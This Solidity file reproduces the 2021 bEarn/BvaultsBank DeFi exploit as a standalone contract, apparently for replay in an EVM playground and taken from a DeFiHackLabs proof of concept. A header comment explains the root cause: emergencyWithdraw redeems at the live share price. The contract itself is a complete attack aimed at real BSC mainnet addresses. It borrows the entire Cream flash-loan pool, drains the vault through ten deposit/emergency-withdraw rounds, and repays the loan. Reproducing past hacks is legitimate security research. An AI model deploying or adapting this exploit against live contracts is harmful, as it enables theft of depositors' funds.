// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2021-05-bEarn).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract: the
// Cream `flashLoan(receiver, amount, params)` callback `executeOperation` lives on
// the test itself (`receiver = address(this)`), so there is no standalone contract
// to deploy. This contract is a faithful, self-contained copy of that inline
// attack (testExploit's flash-loan trigger + executeOperation's drain loop),
// copied verbatim from test/bEarn_exp.sol so the playground can deploy it and
// record run(). Logic and constants are copied verbatim.
//
// Root cause: BvaultsBank.emergencyWithdraw pays the caller
// `user.shares * wantLockedTotal / sharesTotal`, reading the strategy's LIVE
// ratio with no deposit-time snapshot, no slippage bound, and (unlike withdraw)
// no unstaking freeze. The Alpaca ibBUSD redeem is profitable at this block, so
// each deposit→emergencyWithdraw round bumps wantLockedTotal while sharesTotal
// stays flat — re-minting the same shares but redeeming them at a higher price.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ICreamFi {
    function flashLoan(address receiver, uint256 amount, bytes calldata params) external;
    function getCash() external returns (uint256);
}

interface IBVault {
    function deposit(uint256 _pid, uint256 _wantAmt) external;
    function emergencyWithdraw(uint256 _pid) external;
}

contract BEarnBvaultsDrain {
    address internal constant CreamFi = 0x2Bc4eb013DDee29D37920938B96d353171289B7C;
    address internal constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address internal constant bVault = 0xB390B07fcF76678089cb12d8E615d5Fe494b01Fb;

    // entrypoint — mirrors ContractTest.testExploit():
    //   address receiver = address(this);
    //   uint256 amount = ICreamFi(CreamFi).getCash();
    //   ICreamFi(CreamFi).flashLoan(receiver, amount, "1");
    function run() external {
        address receiver = address(this);
        uint256 amount = ICreamFi(CreamFi).getCash();
        ICreamFi(CreamFi).flashLoan(receiver, amount, "1");
    }

    // Cream flash-loan callback — copied verbatim from the test's executeOperation.
    function executeOperation(address, address underlying, uint256 amount, uint256 fee, bytes memory) external {
        IERC20(BUSD).approve(bVault, type(uint256).max);

        for (uint256 i = 0; i < 10; i++) {
            IBVault(bVault).deposit(13, IERC20(underlying).balanceOf(address(this)) - 1);
            IBVault(bVault).emergencyWithdraw(13);
        }

        IERC20(BUSD).transfer(CreamFi, amount + fee);
    }
}
